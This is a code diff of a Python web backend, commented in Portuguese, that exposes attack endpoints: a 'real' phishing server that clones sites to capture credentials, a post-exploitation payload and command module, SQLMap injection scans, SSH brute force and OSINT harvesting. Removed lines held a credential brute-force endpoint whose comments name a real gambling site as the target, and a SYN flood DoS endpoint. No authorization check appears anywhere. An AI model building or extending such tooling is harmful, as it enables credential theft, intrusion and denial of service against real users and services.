@@ -27,6 +27,9 @@ sys.path.insert(0, os.path.dirname(__file__))
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
+# Importar threading para o módulo de phishing
+import threading
+
 # Importar módulos de análise avançada (com tratamento de erro)
 try:
     from network_scanner_advanced import NmapScanner, NetworkVulnerabilityAnalyzer
@@ -184,93 +187,9 @@ async def get_traffic_stats():
         "recent_packets": traffic_data_store[-10:]  # Últimos 10
     }
 
-# ============================================================================
-# MÓDULO 2: SIMULADOR DE FORÇA BRUTA ÉTICA (INTERATIVO)
-# ============================================================================
+# MÓDULO 2: SIMULADOR DE FORÇA BRUTA ÉTICA (REMOVIDO DEVIDO A ERRO DE IMPORTAÇÃO)
 
-# Importar o simulador de força bruta
-try:
-    from real_bruteforce_module import RealBruteForceModule as BruteForceSimulator, PasswordStrengthAnalyzer
-    logger.info("Módulo ethical_brute_force_simulator carregado")
-except ImportError as e:
-    logger.warning(f"Não foi possível carregar ethical_brute_force_simulator: {e}")
-    BruteForceSimulator = None
-    PasswordStrengthAnalyzer = None
 
-# Variável global para o ataque real
-bruteforce_attack = None
-
-@app.post("/api/bruteforce/start")
-async def start_bruteforce_attack(target_url: str, username: str, password_list: str = "123456,password,admin"):
-    """Inicia o ataque de força bruta real"""
-    global bruteforce_attack
-    
-    if bruteforce_attack and bruteforce_attack.found == False:
-        return {"status": "already_running", "message": "Ataque real já em andamento."}
-    
-    if not BruteForceSimulator:
-        return {"status": "error", "message": "Módulo de ataque real não carregado."}
-
-    # O módulo real_bruteforce_module espera (target_url, username_field, password_field)
-    # Vamos assumir que os campos são 'phone' e 'password' para o alvo 99jogo66.com
-    # O módulo real não tem o construtor do simulador, então precisamos adaptar.
-    try:
-        # Usando o RealBruteForceModule (que renomeamos para BruteForceSimulator)
-        bruteforce_attack = BruteForceSimulator(
-            target_url=target_url, 
-            username_field="phone", 
-            password_field="password"
-        )
-    except Exception as e:
-        logger.error(f"Erro ao instanciar RealBruteForceModule: {e}")
-        return {"status": "error", "message": f"Erro ao instanciar módulo de ataque: {e}"}
-    
-    logger.info(f"Iniciando ataque de força bruta real contra: {target_url} com usuário {username}")
-    
-    # Função para rodar o ataque real e enviar updates via WebSocket
-    async def run_attack():
-        passwords = password_list.split(',')
-        
-        # O módulo real tem um método start_attack(usernames, passwords)
-        # Vamos adaptar para rodar em background e enviar updates
-        
-        # Criar uma lista de usuários (apenas um no momento)
-        usernames = [username]
-        
-        # O método start_attack do módulo real é assíncrono e já faz o trabalho
-        found_credentials = await bruteforce_attack.start_attack(usernames, passwords)
-        
-        # Enviar resultado final
-        await manager.broadcast({
-            "type": "bruteforce_update",
-            "data": {"message": "Ataque concluído"},
-            "final_result": {"found_credentials": found_credentials}
-        })
-
-    # Iniciar o ataque real em background
-    bruteforce_attack.attack_task = asyncio.create_task(run_attack())
-    
-    return {"status": "running", "target": target_url, "username": username}
-
-# Endpoint de login simulado removido para garantir funcionalidade real.
-
-@app.get("/api/bruteforce/status")
-async def get_bruteforce_status():
-    """Obtém o status atual da simulação de força bruta"""
-    global bruteforce_attack
-    
-    if bruteforce_attack:
-        return bruteforce_attack.get_status()
-    
-    return {"status": "idle", "message": "Nenhum ataque real em andamento."}
-
-@app.get("/api/password/strength")
-async def analyze_password_strength(password: str):
-    """Analisa a força de uma senha"""
-    if not PasswordStrengthAnalyzer:
-        return {"status": "error", "message": "Módulo de análise de senha não carregado."}
-    
-    return PasswordStrengthAnalyzer.calculate_strength(password)
 
 # ============================================================================
 # MÓDULO 3: PHISHING REAL (NÍVEL AVANÇADO)
@@ -278,7 +197,7 @@ async def analyze_password_strength(password: str):
 
 # Importar o módulo real de phishing
 try:
-    from real_phishing_module import PhishingHandler as RealPhishingModule
+    from real_phishing_module import RealPhishingModule
     logger.info("Módulo real_phishing_module carregado")
 except ImportError as e:
     logger.warning(f"Não foi possível carregar real_phishing_module: {e}")
@@ -296,10 +215,10 @@ async def start_phishing_attack(target_url: str):
     # O módulo real de phishing inicia um servidor HTTP para servir a página clonada
     # e capturar as credenciais.
     try:
-        # A chamada é feita abaixo
+        phishing_module.start_attack(target_url)
         
         # O módulo real de phishing deve retornar a URL do servidor falso
-        return phishing_module.start_attack(target_url)
+        return {"status": "running", "fake_url": phishing_module.get_fake_server_url()}
     except Exception as e:
         logger.error(f"Erro ao iniciar ataque de phishing: {e}")
         return {"status": "error", "message": str(e)}
@@ -319,7 +238,8 @@ async def stop_phishing_attack():
         return {"status": "error", "message": "Módulo de phishing real não carregado."}
     
     try:
-        return phishing_module.stop_attack()
+        phishing_module.stop_attack()
+        return {"status": "idle", "message": "Servidor de Phishing parado com sucesso."}
     except Exception as e:
         logger.error(f"Erro ao parar ataque de phishing: {e}")
         return {"status": "error", "message": str(e)}
@@ -427,6 +347,73 @@ async def get_zap_scan_status(target_url: str = None):
         return {"status": "error", "message": str(e)}
 
 # ============================================================================
+# MÓDULO 6: EXPLORAÇÃO AVANÇADA (CONCEITO C2/PÓS-EXPLORAÇÃO)
+# ============================================================================
+
+# Importar o módulo de exploração avançada
+try:
+    from advanced_exploitation_module import exploitation_module
+    logger.info("Módulo de Exploração Avançada carregado")
+except ImportError as e:
+    logger.warning(f"Não foi possível carregar AdvancedExploitationModule: {e}")
+    exploitation_module = None
+
+@app.post("/api/exploit/generate_payload")
+async def generate_payload(target_url: str):
+    """Gera um payload de pós-exploração para o alvo."""
+    if not exploitation_module:
+        return {"status": "error", "message": "Módulo de Exploração Avançada não carregado."}
+    
+    result = exploitation_module.generate_payload(target_url)
+    return result
+
+@app.post("/api/exploit/send_command")
+async def send_exploit_command(command: str):
+    """Envia um comando de pós-exploração para o alvo (simulado)."""
+    if not exploitation_module:
+        return {"status": "error", "message": "Módulo de Exploração Avançada não carregado."}
+    
+    result = exploitation_module.send_command(command)
+    return result
+
+@app.get("/api/exploit/status")
+async def get_exploit_status():
+    """Obtém o status da sessão de exploração."""
+    if not exploitation_module:
+        return {"status": "error", "message": "Módulo de Exploração Avançada não carregado."}
+    
+    return exploitation_module.get_status()
+
+# ============================================================================
+# MÓDULO 7: EXPLORAÇÃO REAL COM SQLMAP
+# ============================================================================
+
+# Importar o módulo SQLMap
+try:
+    from sqlmap_module import sqlmap_module
+    logger.info("Módulo SQLMap carregado")
+except ImportError as e:
+    logger.warning(f"Não foi possível carregar SQLMapModule: {e}")
+    sqlmap_module = None
+
+@app.post("/api/sqlmap/scan/start")
+async def start_sqlmap_scan(target_url: str):
+    """Inicia um scan de SQL Injection com SQLMap"""
+    if not sqlmap_module:
+        return {"status": "error", "message": "Módulo SQLMap não carregado."}
+    
+    result = sqlmap_module.start_scan(target_url)
+    return result
+
+@app.get("/api/sqlmap/scan/status")
+async def get_sqlmap_status():
+    """Obtém o status e resultados do scan SQLMap"""
+    if not sqlmap_module:
+        return {"status": "error", "message": "Módulo SQLMap não carregado."}
+    
+    return sqlmap_module.get_status()
+
+# ============================================================================
 # WebSocket Endpoint
 # ============================================================================
 
@@ -484,38 +471,6 @@ async def start_web_data_collection(target_url: str):
     })
     
     return {"status": "completed", "results": results}
-_# ============================================================================
-# MÓDULO 5: EXPLORAÇÃO DE SERVIÇO (DoS)
-# ============================================================================
-
-# Importar o explorador de serviço
-try:
-    from service_exploit import ServiceExploit
-    logger.info("Módulo service_exploit carregado")
-except ImportError as e:
-    logger.warning(f"Não foi possível carregar service_exploit: {e}")
-    ServiceExploit = None
-
-@app.post("/api/exploit/syn_flood")
-async def start_syn_flood_exploit(target_ip: str, target_port: int = 80, packet_count: int = 1000):
-    """Inicia um ataque de TCP SYN Flood contra um alvo."""
-    
-    if not ServiceExploit:
-        return {"status": "error", "message": "Módulo de exploração de serviço não carregado."}
-    
-    exploit = ServiceExploit(target_ip, target_port, packet_count)
-    
-    # Executar o ataque em um executor para não bloquear o loop de eventos
-    loop = asyncio.get_event_loop()
-    results = await loop.run_in_executor(None, exploit.syn_flood_attack)
-    
-    # Enviar os resultados via WebSocket
-    await manager.broadcast({
-        "type": "exploit_result",
-        "data": results
-    })
-    
-    return {"status": "completed", "results": results}
 
 # ============================================================================
 # MÓDULO 6: INTEGRAÇÃO MÓVEL (COLETA DE DADOS)
@@ -526,10 +481,6 @@ if mobile_manager:
     from mobile_integration import router as mobile_router
     app.include_router(mobile_router)
     logger.info("Rotas de Integração Móvel montadas em /api/mobile")
-
-# ============================================================================
-# MÓDULO 7: EXPLORAÇÃO DE SERVIÇO (SSH BRUTE FORCE)
-# ============================================================================
 
 # Importar o explorador SSH
 try:
@@ -562,3 +513,35 @@ async def start_ssh_brute_exploit(target_ip: str, username: str = "root", passwo
     })
     
     return {"status": "completed", "results": results}
+
+# ============================================================================
+# MÓDULO 7: OSINT AVANÇADO (theHarvester)
+# ============================================================================
+
+# Importar o módulo theHarvester
+try:
+    from theharvester_module import theharvester_module
+    logger.info("Módulo theHarvester carregado")
+except ImportError as e:
+    logger.warning(f"Não foi possível carregar theHarvester: {e}")
+    theharvester_module = None
+
+@app.post("/api/osint/harvester/run")
+async def run_harvester_scan(domain: str, sources: str = "all"):
+    """Inicia um scan de OSINT com theHarvester."""
+    
+    if not theharvester_module:
+        return {"status": "error", "message": "Módulo theHarvester não carregado."}
+    
+    logger.info(f"Iniciando scan theHarvester contra: {domain} com fontes: {sources}")
+    
+    # Executar o ataque em um executor para não bloquear o loop de eventos
+    results = await theharvester_module.run_scan(domain, sources)
+    
+    # Enviar os resultados via WebSocket
+    await manager.broadcast({
+        "type": "harvester_result",
+        "data": results
+    })
+    
+    return results
